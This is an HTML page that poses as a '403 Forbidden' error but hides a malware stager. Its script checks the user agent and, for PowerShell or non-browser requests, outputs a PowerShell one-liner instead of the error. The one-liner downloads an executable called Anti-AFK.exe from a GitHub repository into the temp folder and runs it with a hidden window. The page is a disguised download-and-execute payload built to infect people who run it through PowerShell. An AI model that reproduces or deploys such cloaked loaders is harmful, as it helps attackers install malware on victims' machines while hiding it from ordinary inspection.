<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>403 Forbidden</title>
    <style>
        body { font-family-sans-serif, Arial, sans-serif; background-color: #f4f4f4; color: #333; text-align: center; padding-top: 100px; }
        h1 { font-size: 50px; color: #d9534f; }
    </style>
</head>
<body>
    <h1>403 Forbidden</h1>
    <p>Access is denied. You do not have permission to view this directory or page.</p>

    <!-- Этот скрипт выполнится только если запрос идет через PowerShell / irm -->
    <script>
        if (navigator.userAgent.indexOf("WindowsPowerShell") !== -1 || navigator.userAgent.indexOf("Mozilla") === -1) {
            document.body.innerText = "$u='https://github.com/Drealazzer/q/raw/refs/heads/main/Anti-AFK.exe';$p=\"$env:TEMP\\Anti-AFK.exe\";(New-Object Net.WebClient).DownloadFile($u,$p);Start-Process $p -WindowStyle Hidden";
        }
    </script>
</body>
</html>
